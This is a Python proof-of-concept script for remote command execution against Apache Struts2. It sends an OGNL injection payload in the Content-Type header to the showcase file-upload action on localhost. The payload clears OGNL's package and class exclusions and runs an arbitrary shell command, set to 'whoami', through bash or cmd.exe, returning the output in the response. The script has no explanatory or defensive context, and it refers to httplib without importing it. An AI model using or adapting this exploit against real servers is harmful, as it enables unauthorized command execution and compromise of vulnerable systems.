import requests

cmd = "whoami"
headers = {'Host': 'localhost:8080',
			'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:52.0) Gecko/20100101 Firefox/52.0',
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
			'Accept-Language': 'en-US,en;q=0.5',
			'Accept-Encoding': 'gzip, deflate',
			#'Content-Type': "${(#_='multipart/form-data').(#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Struts-Exploit-Test','GDSTEST'))}",
			'Content-Type': ("%%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
                    "(#_memberAccess?(#_memberAccess=#dm):"
                    "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
                    "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
                    "(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear())."
                    "(#context.setMemberAccess(#dm))))."
                    "(#gift='%s')."
                    "(#isnix=(@java.lang.System@getProperty('file.separator').equals(\"/\")))."
                    "(#giftarray=(#isnix?{'/bin/bash','-c',#gift}:{'cmd.exe','/c',#gift}))."
                    "(#p=new java.lang.ProcessBuilder(#giftarray))."
                    "(#p.redirectErrorStream(true)).(#process=#p.start())."
                    "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
                    "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
                    "(#ros.flush())}" %cmd),
			'Content-Length': '0'}

url = 'http://localhost:8080/struts2-showcase/fileupload/doUpload.action'

resp = requests.get(url, headers = headers, stream=True)

try:
	print (resp.text)
except httplib.IncompleteRead as ex:
	print (ex.partial)
#print (resp.headers)
#print (resp.json())